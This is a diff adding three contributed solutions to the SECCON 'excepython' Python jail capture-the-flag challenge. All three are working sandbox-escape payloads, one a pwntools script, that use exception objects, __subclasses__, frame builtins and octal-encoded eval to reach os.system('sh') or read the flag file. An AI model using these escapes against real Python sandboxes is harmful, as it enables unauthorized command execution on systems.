@@ -347,3 +347,113 @@ Save the previous `ex` into `ex.args` and recover it:
 {}[*[f:=ex.args[0]][0][:1],f[2](f[1])[0]]
 {}[[x:=ex.args[0],x][0][0](x[1])]
 ```
+
+@oh_word:
+
+```python
+enc_str = lambda s: '"%s"' % "".join(f"\\x{ord(c):02X}" for c in s)
+
+slp(f'{enc_str("{.__class__.__base__.__subclasses__.x}")}.format(0)')
+slp(f"[0 for ex.__typing_subst__ in [lambda a,k={{}}: [k['r'] for k['r'] in [[a[0] if 'r' not in k else k['r']][0](*a[1:])]][0]]]")
+slp("[sb:=ex.obj()]and sb[0][ex][[sb[-1]]]")
+slp("[sb:=ex.obj()]and sb[0][ex][[-1]]")
+sla(b"help> ", b"subprocess")
+sla(b"help> ", b"q")
+
+slp(f"[0 for ex.__typing_subst__ in [lambda a,k={{}}: [k['r'] for k['r'] in [[a[0] if 'r' not in k else k['r']][0](*a[1:])]][0]]]")
+slp("[sb:=ex.obj()]and sb[0][ex][[sb[306], ['/usr/bin/cat']+['/flag-d108ec7a911b72568e8aa0855f1787d8\\x2etxt']]]")
+
+p.interactive()
+```
+
+@uNickz:
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+if args.DEBUG:
+    context.log_level = "DEBUG"
+
+host, port = "excepython.seccon.games", 5000
+
+rr  = lambda *x, **y: io.recvrepeat(*x, **y)
+ru  = lambda *x, **y: io.recvuntil(*x, **y)
+rl  = lambda *x, **y: io.recvline(*x, **y)
+rc  = lambda *x, **y: io.recv(*x, **y)
+sla = lambda *x, **y: io.sendlineafter(*x, **y)
+sa  = lambda *x, **y: io.sendafter(*x, **y)
+sl  = lambda *x, **y: io.sendline(*x, **y)
+sn  = lambda *x, **y: io.send(*x, **y)
+
+# -- Exploit goes here --
+
+io = remote(host, port)
+
+payloads = """
+    1/0
+
+    # args[0] = lambda function
+    # args[1] = exception instance
+    # args[2] = attribute name to get from exception instance
+
+    # (lambda, ZeroDivisionError('division by zero'))
+    {}[ lambda *args: [args[0]] + [args[1].__getattribute__( *args[2:][-2:] )], ex ]
+
+    # (lambda .__class__, <class 'ZeroDivisionError'>)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]+["__class__"] )][1] ]
+
+    # (lambda .__class__, <class 'type'>)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__class__"] )][1] ]
+
+    # (lambda .__base__, <class 'object'>)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__base__"] )][1] ]
+
+    # (lambda .__subclasses__, <built-in method __subclasses__>)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__subclasses__"] )][1] ]
+
+    # (lambda .__subclasses__(), <class 'os._wrap_close'>)
+    {}[ *[ a:=ex.args[0], [a[0]]+[a[1]()[167]] ][1] ]
+
+    # (lambda, <function _wrap_close.__init__>)
+    {}[ *[a:=ex.args[0], a[0]( *[*a]*2+["__init__"] )][1] ]
+
+    # (<built-in function system>, )
+    {}[ [a:=ex.args[0], a[0]( *[*a]+["__globals__"] )[1]["system"] ][1] ]
+
+    ex.args[0]("sh")
+"""
+
+for payload in payloads.strip().splitlines():
+    payload = payload.strip()
+    if payload.startswith("#"): continue
+    payload = payload.split("#", 1)[0].strip()
+    if not payload: continue
+    sla(b"jail> ", payload.strip().encode())
+
+io.interactive() # SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
+io.close()
+```
+
+@Muhammed.:
+
+```python
+# ex.__traceback__.tb_frame.f_builtins['eval']
+# ex.__traceback__.tb_frame.f_builtins['eval']('().__class__.__class__.__subclasses__([].__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")')
+[
+    [
+    [[o:=ex] if i == "0" else 0] and
+    [[s:="__traceback__"] if i == "0" else 0] and
+    [[s:="tb_frame"] if i == "1" else 0] and
+    [[s:="f_builtins"] if i == "2" else 0] and
+    [[s:="\50\51\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\56\137\137\163\165\142\143\154\141\163\163\145\163\137\137\50\133\135\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\51\133\60\135\56\162\145\147\151\163\164\145\162\56\137\137\142\165\151\154\164\151\156\163\137\137\133\42\137\137\151\155\160\157\162\164\137\137\42\135\50\42\157\163\42\51\56\163\171\163\164\145\155\50\42\163\150\42\51"] if i == "3" else 0] and
+    [[tt:=o.__getattribute__] if i == "0" or i == "1" or i == "2" else 0] and
+    [[tt:=o['eval']] if i == "3" else 0] and
+    [[o:=tt(s)] if True else 0]
+    ] for i in "0123"
+]
+
+jail> muhammed
+jail> [ [ [[o:=ex] if i == "0" else 0] and [[s:="__traceback__"] if i == "0" else 0] and [[s:="tb_frame"] if i == "1" else 0] and [[s:="f_builtins"] if i == "2" else 0] and [[s:="\50\51\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\56\137\137\163\165\142\143\154\141\163\163\145\163\137\137\50\133\135\56\137\137\143\154\141\163\163\137\137\56\137\137\143\154\141\163\163\137\137\51\133\60\135\56\162\145\147\151\163\164\145\162\56\137\137\142\165\151\154\164\151\156\163\137\137\133\42\137\137\151\155\160\157\162\164\137\137\42\135\50\42\157\163\42\51\56\163\171\163\164\145\155\50\42\163\150\42\51"] if i == "3" else 0] and [[tt:=o.__getattribute__] if i == "0" or i == "1" or i == "2" else 0] and [[tt:=o['eval']] if i == "3" else 0] and [[o:=tt(s)] if True else 0] ] for i in "0123" ]
+```
